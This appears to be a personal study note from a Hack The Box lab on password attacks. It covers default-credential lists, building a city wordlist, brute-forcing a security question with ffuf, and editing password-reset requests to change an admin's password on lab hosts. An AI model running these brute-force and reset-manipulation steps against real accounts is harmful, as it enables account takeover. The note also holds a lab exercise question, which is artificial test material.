# 👩‍🦰 Password Attacks

## Default Credentials

Many web applications are set up with default credentials to allow accessing it after installation. However, these credentials need to be changed after the initial setup of the web application

Here are lists of default credentials for a wide variety of web applications: [CIRT.net](https://www.cirt.net/passwords) also [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub

let's imagine the following web app:

<figure><img src="../../../.gitbook/assets/image (17) (3).png" alt=""><figcaption></figcaption></figure>

We can spot it's a bookstack web app, we can then go and see if we can't find some default creds online ->

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Password Reset

### Guessable Password Reset

We could imagine questions like the following:

* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

Then it's on us to chase for the good wordlist such as [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.

```shell-session
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt 
```

so let's imagine after entering our username wer got asked a question, it would look like this:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now it's on us to craft a payload:

```shell-session
ElFelixi0@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

and then we can reset password

But let's imagine we had a nice osint phase, we could pretty much guess from which country is the person from the website or the social media, we can go deaper and make a more accurate list:

```shell-session
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

### Manipulating the Reset Request

let's imagine the following:

<figure><img src="../../../.gitbook/assets/image (1355).png" alt=""><figcaption></figcaption></figure>

```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

after that we have the security question ->

```http
<SNIP>
security_response=London&username=htb-stdnt
```

Finally, we can reset the user's password:&#x20;

```http
<SNIP>
password=P@$$w0rd&username=htb-stdnt
```

We can imagine that we can skip the security question and set the password of an entirely different account

```http
password=P@$$w0rd&username=admin
```

_**Which city is the admin user from?**_

<figure><img src="../../../.gitbook/assets/image (1356).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1357).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1358).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w city_wordlist.txt -u http://94.237.59.63:43371/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=j0527s0oqrj0q0s6qh30c626ma" -d "security_response=FUZZ" -fr "Incorrect response."
```

<figure><img src="../../../.gitbook/assets/image (1359).png" alt=""><figcaption></figcaption></figure>
